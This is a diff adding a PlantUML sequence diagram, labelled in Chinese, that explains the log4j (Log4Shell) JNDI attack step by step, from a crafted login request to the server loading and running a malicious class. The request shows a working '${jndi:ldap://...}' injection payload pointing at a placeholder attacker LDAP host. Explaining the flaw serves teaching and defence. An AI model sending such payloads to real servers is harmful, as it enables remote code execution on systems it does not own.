@@ -1,0 +1,12 @@
+@startuml
+
+攻击者客户端 -> 应用服务端: 1.构造恶意请求:\nhttp://ip:port/login?userName=\n${jndi:ldap://攻击者ladp服务IP:端口/Exploit}
+
+应用服务端 -> 应用服务端: 2.login接口打印请求日志\nlog.info("登录,用户名:{}",userName);
+
+应用服务端 -> 攻击者ladp服务: 3.log4j漏洞:打印恶意构造的日志时会请求ladp服务
+攻击者ladp服务 -> 应用服务端: 4.返回攻击者恶意构造的class文件的http地址
+应用服务端 -> 攻击者http服务: 5.发送http,请求恶意class文件
+攻击者http服务 -> 应用服务端: 6.返回恶意class文件
+应用服务端 -> 应用服务端: 7.加载恶意class文件,执行恶意代码
+@enduml
